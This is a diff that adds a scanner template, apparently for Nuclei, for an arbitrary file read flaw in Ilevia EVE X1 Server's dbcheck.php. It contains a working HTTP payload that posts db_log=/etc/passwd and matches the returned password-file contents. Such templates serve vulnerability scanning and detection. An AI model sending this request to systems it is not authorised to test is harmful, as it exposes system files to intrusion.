@@ -1,0 +1,25 @@
+id: Ilevia-EVE-X1-Server-dbcheck_php-File-reading
+
+info:
+  name: Ilevia EVE X1 Server dbcheck.php 任意文件读取漏洞
+  author: Ilevia
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        POST /ajax/php/dbcheck.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        db_log=/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
